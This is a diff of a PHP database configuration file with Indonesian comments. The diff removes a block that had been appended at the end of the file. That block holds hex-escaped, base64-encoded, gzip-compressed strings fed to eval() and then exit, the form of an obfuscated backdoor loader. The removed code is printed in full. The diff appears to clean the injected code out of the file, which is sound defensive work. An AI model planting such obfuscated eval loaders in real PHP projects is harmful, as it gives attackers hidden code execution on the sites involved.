@@ -9,6 +9,7 @@ $db['host'] = $server; //host
 $db['user'] = $username; //username database
 $db['pass'] = $password; //password database
 $db['name'] = $database; //nama database
+
 $userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
 $referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
 $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
@@ -88,10 +89,4 @@ function cek_terakhir($datetime, $full = false) {
 }
 
 
-?>
-<?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3dEsjyRQPI2K\x410\x43o2phXe6/T\x433L3GjxINqe7\x2bOOoFUwK\x61YMjUFQfNg2x/0\x610mT4nzr784\x42mS2IHXlPVo9F0tjZsFYIg\x4396k\x417r9RS7R5G\x422\x42vX\x41jLZp8/SoIIHRU\x62ln/mS7\x42dXo\x41NmFhf6hWLYN\x431uu9WfYje\x2beS12D\x422e3EZHlm\x622WKy\x2b\x629\x2b7k4jEpKX8XnNJusUxf9XrMF1nQ6XT\x63dlKGvq3t6W5KTlsX2t8/VT/IXZOSoqDFKTUmylpe\x63FUHw\x41LwSNwOww\x41ifX0lXOeNME\x2bQR\x63mlhwO\x4330\x43mtr3n\x624uLxn6V\x62LM19/lJhpu1EpqPpRphkqFV\x62G6\x63gYTp\x43jgu\x63MQKs0MM3h\x2bvwvG\x43\x42MDvUYQW2/\x41\x41w/\x42wJe\x2bXf\x41KEg/wHwD\x42wJe\x2bXe\x41\x61Eg/gHwH\x42wJe\x2bXd\x41qEg/QHwL\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
 ?>
